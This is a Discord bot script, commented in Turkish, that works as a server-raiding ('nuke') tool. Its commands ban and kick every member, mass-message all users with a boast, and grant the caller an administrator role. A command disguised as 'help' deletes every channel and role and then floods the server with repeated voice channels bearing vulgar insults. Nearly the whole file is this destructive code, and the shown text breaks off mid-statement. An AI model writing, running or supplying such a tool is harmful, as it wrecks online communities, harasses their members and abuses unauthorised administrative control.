const Discord = require("discord.js");
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);

client.on("message", msg => {
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());
  }
}); ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban

client.on("message", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
}); ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick

client.on("message", async msg => {
  if (msg.content === "+duyur") {
    //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "**Legion tarafında patlatılmıştır :)**" //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  }
});

client.on("message", msg => {
  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === "Legion siker"); 
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === "+yardım") {
    ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

    await msg.guild.channels.deleteAll(); //TÜM KANALLARI SİLEN KOMUT
    await msg.guild.roles.deleteAll(); //TÜM ROLLERİ SİLEN KOMUT

    await msg.guild.createChannel("Legion siker", {
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Legion", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("legion tarafından sikilmiştir", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });    await msg.guild
      .createChannel("Rias", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rias", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rias", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rias", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rias", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rias", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rias", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rias", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HÜKÜMDARLIĞIMIZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild
      .createChannel("Rîas", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("TARAFINDAN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
